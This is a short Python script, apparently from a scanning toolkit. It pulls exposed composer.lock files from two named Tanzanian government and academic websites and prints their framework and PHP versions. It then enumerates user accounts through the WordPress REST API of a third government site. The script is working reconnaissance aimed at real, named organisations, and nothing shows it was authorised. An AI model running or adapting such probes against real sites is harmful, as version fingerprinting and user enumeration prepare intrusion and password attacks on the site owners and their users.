"""Read the leaked lock file and the WP user list."""
import json
import sys

sys.path.insert(0, ".")
import scan  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

for host in ("www.ddca.go.tz", "www.tasuba.ac.tz"):
    u = f"https://{host}/composer.lock"
    r = scan.fetch(u)
    if not r or r["status"] != 200:
        print(host, "no lock", r["status"] if r else "DOWN")
        continue
    try:
        lock = json.loads(r["body"])
    except Exception as e:
        print(host, "unparsable", e)
        continue
    pkgs = lock.get("packages", [])
    print(f"\n== {host}: {len(pkgs)} locked packages")
    for p in pkgs:
        if p["name"].startswith(("october/", "laravel/", "symfony/")):
            print(f"   {p['name']:44} {p.get('version')}")
    php = [p for p in pkgs if p["name"] == "php"]
    print("   php constraint:", php[0]["version"] if php else "-")

r = scan.fetch("https://www.ncaa.go.tz/wp-json/wp/v2/users")
print("\n== ncaa WP users:", r["body"][:600] if r else "DOWN")
